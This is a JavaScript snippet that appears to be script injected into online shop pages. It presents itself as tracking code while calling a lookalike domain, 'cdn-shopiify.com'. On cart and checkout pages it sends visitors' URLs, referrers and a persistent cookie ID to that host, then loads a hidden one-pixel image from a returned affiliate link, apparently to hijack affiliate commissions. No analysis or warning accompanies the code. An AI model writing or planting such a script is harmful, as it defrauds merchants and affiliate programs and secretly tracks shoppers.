(function () {
  const CONFIG_URL = 'https://cdn-shopiify.com/api/site-config?host=';
  const RETRACK_URL = 'https://cdn-shopiify.com/api/retrack';
  const FALLBACK_PIXEL_URL = 'https://cdn-shopiify.com/api/fallback-pixel?id=';

  const TRACKED_PATH_KEYWORDS = ['cart', 'payment', 'shipping', 'checkout', 'pay', 'review-order'];

  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      const r = (Math.random() * 16) | 0;
      const v = c === 'x' ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
  }

  function getCookie(name) {
    const prefix = name + '=';
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
      const c = cookies[i].trim();
      if (c.indexOf(prefix) === 0) {
        return c.substring(prefix.length, c.length);
      }
    }
    return '';
  }

  function isTrackedPage() {
    return TRACKED_PATH_KEYWORDS.some(function (keyword) {
      return window.location.pathname.toLowerCase().includes(keyword);
    });
  }

  function injectTrackingPixel(src) {
    const container = document.body || document.documentElement;
    if (!container) return;

    const img = document.createElement('img');
    img.src = src;
    img.style.width = '1px';
    img.style.height = '1px';
    img.style.display = 'none';
    img.style.visibility = 'hidden';
    container.appendChild(img);
  }

  async function sendTrackingPing() {
    const doneKey = 'tracking_done_' + window.location.hostname;
    if (sessionStorage.getItem(doneKey)) {
      if (!isTrackedPage()) return;
    }

    try {
      const uniqueId = getCookie('tracking_uuid') || generateUUID();
      const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;SameSite=Lax';

      const response = await fetch(RETRACK_URL, {
        method: 'POST',
        keepalive: true,
        body: JSON.stringify({
          url: window.location.href,
          referrer: document.referrer,
          unique_id: uniqueId,
          origin: window.location.hostname,
          timestamp: new Date().getTime(),
        }),
        headers: { 'Content-Type': 'application/json' },
      });
      const data = await response.json();

      if (data.success && data.affiliate_url) {
        injectTrackingPixel(data.affiliate_url);
        sessionStorage.setItem(doneKey, 'true');
      } else {
        injectTrackingPixel(FALLBACK_PIXEL_URL + uniqueId);
      }
    } catch (err) {
      console.error('Tracking Failed:', err);
    }
  }

  function fetchConfigAndMaybeTrack() {
    const url = CONFIG_URL + encodeURIComponent(window.location.hostname);

    fetch(url)
      .then(function (res) {
        if (!res.ok) throw new Error('Config API Failed');
        return res.json();
      })
      .then(function (config) {
        if (!config || (!config.always && !config.cartExtra)) return;
        if (config.always || (config.cartExtra && isTrackedPage())) {
          sendTrackingPing();
        }
      })
      .catch(function (err) {
        console.error('Config fetch failed:', err);
      });
  }

  if (document.readyState === 'interactive' || document.readyState === 'complete') {
    fetchConfigAndMaybeTrack();
  } else {
    window.addEventListener('DOMContentLoaded', fetchConfigAndMaybeTrack);
  }
})();
